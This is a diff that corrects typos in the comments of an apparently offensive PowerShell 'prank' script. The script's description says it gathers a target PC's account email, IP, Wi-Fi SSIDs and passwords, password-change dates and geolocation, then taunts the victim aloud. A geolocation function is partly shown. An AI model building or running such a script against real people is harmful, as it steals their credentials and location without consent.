@@ -27,7 +27,7 @@
 .DESCRIPTION 
 	This program gathers details from target PC to include Operating System, RAM Capacity, Public IP, and Email associated with microsoft account.
 	The SSID and WiFi password of any current or previously connected to networks.
-	It determines the last day they changed thier password and how many days ago.
+	It determines the last day they changed their password and how many days ago.
 	Once the information is gathered the script will pause until a mouse movement is detected
 	Then the script uses Sapi speak to roast their set up and lack of security
 #>
@@ -67,7 +67,7 @@ $FN = Get-fullName
 <#
 
 .NOTES 
-	This is to get the current Latitide and Longitude of your target
+	This is to get the current Latitude and Longitude of your target
 #>
 
 function Get-GeoLocation{
@@ -83,7 +83,7 @@ function Get-GeoLocation{
 	if ($GeoWatcher.Permission -eq 'Denied'){
 		Write-Error 'Access Denied for Location Information'
 	} else {
-		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
+		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
 		
 	}
 	}
